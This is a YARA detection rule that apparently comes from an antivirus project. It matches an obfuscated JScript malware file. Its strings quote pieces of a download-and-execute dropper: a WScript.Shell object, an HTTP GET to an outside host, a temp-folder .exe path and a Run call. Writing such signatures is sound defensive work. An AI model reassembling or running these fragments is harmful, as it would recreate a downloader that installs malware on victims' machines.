rule sig_20160329_30c4410bf68e08a01e6428f9482d2dfb {
  meta:
    description = "datamaliciousorder - file 20160329_30c4410bf68e08a01e6428f9482d2dfb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "ca6a7ebfc690ac0d1afa2be0bc7321ea7941fb4c47feb454cc7fcbc41b166c57"

  strings:
    $s1  = "function Bppzepbnrs() {return Phseqmbfok[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"ZA6Mosj4b.exe\";};" fullword ascii
    $s2  = "Hhfujd[Ljafvllm](\"GET\", \"http://www.hiveclick.com/m4usd\", false);" fullword ascii
    $s3  = "function Eukjihr(Rviuuv, Etvfj){return Rviuuv - Etvfj;};" fullword ascii
    $s4  = "var Phseqmbfok = function Yxrezvnha() {return WScript[Dgyxlwall](\"WScript.Shell\");}();" fullword ascii
    $s5  = "function Halogpiwi() {return ((Aidysv == true) && (Aidysv == Cubkofwb)) ? 1 : Ovufx;};" fullword ascii
    $s6  = "do {WScript[Veynzser](Caauvfs() * 11)} while (Hhfujd[\"readystate\"] < 4 );" fullword ascii
    $s7  = "function Nongpey(Wbrno){Phseqmbfok[\"Run\"](Wbrno, Ovufx, Ovufx);};" fullword ascii
    $s8  = "var Aidysv = false;" fullword ascii
    $s9  = "function Xxotlslx(){return Dgyxlwall;};" fullword ascii
    $s10 = "var Hybdl = new this[\"Date\"]();" fullword ascii
    $s11 = "var Cubkofwb = false;" fullword ascii
    $s12 = "var Ywkgbxxips = false;" fullword ascii
    $s13 = "function Akqtwsvz(Duvet) {var Bvqspq = (1, 2, 3, 4, 5, Duvet); return Bvqspq;};" fullword ascii
    $s14 = "return Eukjihr(Ovbha, Fnxqdebxsr);" fullword ascii
    $s15 = "Cubkofwb = true; " fullword ascii
    $s16 = "Aidysv = true; " fullword ascii
    $s17 = "function Xedumhyrh(){return Xlwrfqhreb;};" fullword ascii
    $s18 = "function Scrsxz()" fullword ascii
    $s19 = " while (Plkggnr){" fullword ascii
    $s20 = "} catch(Dywcgskyz){Plkggnr = (\"asdfa\", \"fadfasdf\", \"afdafa\", 2);};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}